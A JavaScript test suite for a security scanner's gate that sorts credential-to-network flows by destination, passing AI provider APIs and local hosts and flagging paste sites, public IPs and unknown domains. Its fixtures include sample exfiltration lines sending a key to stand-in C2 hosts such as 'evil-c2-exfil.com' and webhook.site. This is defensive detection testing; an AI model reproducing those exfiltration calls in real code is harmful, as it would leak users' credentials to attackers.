'use strict';

// Destination-awareness gate (chantier FPR segment A, 2026-06).
// A credential→network taint flow (intent_credential_exfil / cross_file_dataflow /
// detached_credential_exfil) is a FALSE POSITIVE when EVERY network destination is provably
// non-exfil: loopback/private/reserved IP, or a curated SaaS/cloud/AI provider API. Any
// suspicious/paste host, public IP, or UNKNOWN domain ⇒ keep firing (anti-evasion floor).
// These tests LOCK the gate semantics AND the garde-fou (real exfil — provider+C2, public
// IP, paste site — must NOT be classified benign). All behavioral: call the functions.

const fs = require('fs');
const os = require('os');
const path = require('path');
const { test, assert } = require('../test-utils');
const {
  networkDestinationsAllBenign, isLocalOrReservedHost, isPublicIpHost,
  extractHostsFromContent, domainMatchesSuffix,
} = require('../../src/sdk-destination.js');
const { filterFirstPartyNetworkFlows } = require('../../src/scanner/module-graph');

async function runSdkDestinationTests() {
  console.log('\n=== SDK DESTINATION GATE TESTS (segment A) ===\n');

  // ---- networkDestinationsAllBenign: BENIGN (suppress) ----
  test('dest-gate: single provider (anthropic) → benign', () => {
    assert(networkDestinationsAllBenign("fetch('https://api.anthropic.com/v1/messages')") === true);
  });
  test('dest-gate: multi-provider (gemini googleapis + anthropic) → benign', () => {
    const c = "fetch('https://generativelanguage.googleapis.com/v1'); https.request({hostname:'api.anthropic.com'})";
    assert(networkDestinationsAllBenign(c) === true);
  });
  test('dest-gate: AI providers added in 2025-26 (openrouter+deepseek+openai) → benign', () => {
    const c = "fetch('https://openrouter.ai/api'); fetch('https://api.deepseek.com/v1'); fetch('https://api.openai.com')";
    assert(networkDestinationsAllBenign(c) === true);
  });
  test('dest-gate: loopback-only (otel collector) → benign', () => {
    assert(networkDestinationsAllBenign("fetch('http://localhost:4318/v1/traces')") === true);
  });
  test('dest-gate: env-default literal host `|| "127.0.0.1"` (remnic pattern) → benign', () => {
    const c = 'const HOST = process.env.REMNIC_HOST || "127.0.0.1";\nhttp.request({ host: HOST, port: 4318 })';
    assert(networkDestinationsAllBenign(c) === true);
  });
  test('dest-gate: reserved test domain (example.com) → benign', () => {
    assert(networkDestinationsAllBenign("fetch('https://example.com/x')") === true);
  });

  // ---- networkDestinationsAllBenign: NOT benign (keep firing) — the garde-fou ----
  test('dest-gate: ecto pattern (webhook.site + public IP + loopback) → NOT benign', () => {
    const c = "fetch('https://webhook.site/x'); fetch('http://154.57.164.82:31250'); fetch('http://127.0.0.1:31250')";
    assert(networkDestinationsAllBenign(c) === false);
  });
  test('dest-gate: provider + C2 on a normal domain → NOT benign (anti-evasion)', () => {
    assert(networkDestinationsAllBenign("fetch('https://api.openai.com'); fetch('https://evil-c2.com/x')") === false);
  });
  test('dest-gate: unknown domain alone → NOT benign', () => {
    assert(networkDestinationsAllBenign("fetch('https://my-random-host.io/collect')") === false);
  });
  test('dest-gate: public IP literal → NOT benign', () => {
    assert(networkDestinationsAllBenign("https.request({host:'203.0.113.7'})") === false);
  });
  test('dest-gate: suffix is label-anchored — evilx.ai does NOT match provider x.ai → NOT benign', () => {
    assert(networkDestinationsAllBenign("fetch('https://evilx.ai/x')") === false);
  });
  test('dest-gate: no extractable host → NOT benign (cannot confirm)', () => {
    assert(networkDestinationsAllBenign("const data = readFileSync(p); send(data)") === false);
  });

  // ---- host classifiers ----
  test('host: loopback / private / link-local → local', () => {
    ['127.0.0.1', '10.0.0.5', '192.168.1.1', '172.20.0.1', '169.254.0.1', 'localhost', '::1']
      .forEach(h => assert(isLocalOrReservedHost(h) === true, `expected local: ${h}`));
  });
  test('host: public IPv4 → not local, is public', () => {
    assert(isLocalOrReservedHost('154.57.164.82') === false);
    assert(isPublicIpHost('154.57.164.82') === true);
    assert(isPublicIpHost('127.0.0.1') === false);
  });
  test('host: 172.32.x is public (outside 172.16/12)', () => {
    assert(isLocalOrReservedHost('172.32.0.1') === false);
    assert(isPublicIpHost('172.32.0.1') === true);
  });

  // ---- extractHostsFromContent ----
  test('extract: URLs + request-option hostnames + literal IP defaults', () => {
    const hosts = extractHostsFromContent("fetch('https://api.x.ai/v1'); https.request({hostname:'api.anthropic.com'}); const H = e || '127.0.0.1';");
    assert(hosts.includes('api.x.ai') && hosts.includes('api.anthropic.com') && hosts.includes('127.0.0.1'), JSON.stringify(hosts));
  });

  test('provider suffix match is anchored (domainMatchesSuffix)', () => {
    assert(domainMatchesSuffix('api.x.ai', ['x.ai']) === true);
    assert(domainMatchesSuffix('evilx.ai', ['x.ai']) === false);
  });

  // ---- filterFirstPartyNetworkFlows (cross_file_dataflow gate) ----
  const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'sdkdest-'));
  fs.writeFileSync(path.join(tmp, 'provider.js'), "fetch('https://api.anthropic.com/v1', {headers:{x:key}});");
  fs.writeFileSync(path.join(tmp, 'evil.js'), "fetch('https://evil-c2-exfil.com/collect', {body:key});");
  fs.writeFileSync(path.join(tmp, 'ipc.js'), "ipc.write(key); // electron IPC, no network host");
  fs.writeFileSync(path.join(tmp, 'exec.js'), "const x = eval(key);");
  const mk = (sink, sinkFile) => ({ type: 'cross_file_dataflow', severity: 'CRITICAL', sourceFile: 'store.js', source: 'process.env', sink, sinkFile });

  test('flow-gate: provider-only network sink → dropped', () => {
    const kept = filterFirstPartyNetworkFlows([mk('fetch()', 'provider.js')], tmp);
    assert(kept.length === 0, `expected dropped, kept ${kept.length}`);
  });
  test('flow-gate: evil-C2 network sink → kept', () => {
    const kept = filterFirstPartyNetworkFlows([mk('fetch()', 'evil.js')], tmp);
    assert(kept.length === 1);
  });
  test('flow-gate: IPC write() with no host → kept (cannot confirm benign)', () => {
    const kept = filterFirstPartyNetworkFlows([mk('write()', 'ipc.js')], tmp);
    assert(kept.length === 1);
  });
  test('flow-gate: exec sink (eval) → kept (never destination-gated)', () => {
    const kept = filterFirstPartyNetworkFlows([mk('eval()', 'exec.js')], tmp);
    assert(kept.length === 1);
  });
  test('flow-gate: mixed batch → only provider flow dropped', () => {
    const kept = filterFirstPartyNetworkFlows(
      [mk('fetch()', 'provider.js'), mk('fetch()', 'evil.js'), mk('write()', 'ipc.js'), mk('eval()', 'exec.js')], tmp);
    assert(kept.length === 3 && !kept.some(f => f.sinkFile === 'provider.js'), JSON.stringify(kept.map(f => f.sinkFile)));
  });
}

module.exports = { runSdkDestinationTests };
